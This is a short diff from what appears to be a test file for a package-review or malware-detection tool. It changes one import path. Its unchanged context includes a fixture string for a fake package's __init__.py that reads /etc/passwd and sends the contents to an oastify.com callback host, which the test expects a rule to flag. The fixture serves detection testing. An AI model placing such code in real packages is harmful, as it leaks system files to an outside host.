@@ -196,7 +196,7 @@ out = VD.signals(new, {"pkg/__init__.py": ["import pickle"]})
 class NewRuleReachesTheAgent(unittest.TestCase):
     def test_rule_file_report_text_is_used(self):
         import review_report
-        from r4 import text_format
+        from output import text_format
         files = package({"mypkg/__init__.py": "import urllib.request\n"
                          "info = open('/etc/passwd').read()\n"
                          "urllib.request.urlopen(urllib.request.Request('https://x.oastify.com/c', data=info.encode()))\n"})
